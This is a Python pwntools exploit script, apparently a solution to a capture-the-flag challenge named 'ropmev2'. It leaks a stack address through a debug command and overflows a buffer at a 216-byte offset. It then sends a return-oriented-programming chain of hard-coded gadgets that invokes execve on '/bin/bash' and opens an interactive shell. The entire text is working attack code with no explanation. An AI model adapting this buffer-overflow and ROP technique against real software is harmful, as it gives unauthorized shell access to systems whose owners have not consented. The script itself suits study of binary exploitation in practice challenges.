from pwn import *
#context.log_level='DEBUG'

p = process("./ropmev2")
elf = ELF("./ropmev2", checksec=False)

def main():

        syscall = p64(0x0000000000401168) # syscall
        pop_rdi = p64(0x000000000040142b) # pop rdi; ret
        pop_rax = p64(0x0000000000401162) # pop rax; ret
        pop_rsi = p64(0x0000000000401429) # pop rsi ; pop r15 ; ret
        pop_rdx = p64(0x0000000000401164) # pop rdx ; pop r13 ; ret

	# 216 offset
	# 16 offset to /bin/bash

	p.sendline("DEBUG")
	print(p.recvuntil("this is "))
	stack_leak = int(p.recvline().strip(), 16)
	log.info("Stack addr: " + hex(stack_leak))

	#gdb.attach(p, aslr=0)
	payload = "\x00XXXXXXX" + "/bin/bash\x00"
	payload = "A"*(216-len(payload)) + payload
	bin_bash = stack_leak - 0x12

	payload2 = payload
	payload2 += pop_rdi
	payload2 += p64(bin_bash)
	payload2 += pop_rsi
	payload2 += p64(0)
	payload2 += p64(0)
	payload2 += pop_rdx
	payload2 += p64(0)
	payload2 += p64(0)
	payload2 += pop_rax
	payload2 += p64(0x3b)
	payload2 += syscall

	#gdb.attach(p, aslr=0)
	p.sendline(payload2)
	p.interactive()

if __name__=="__main__":
	main()
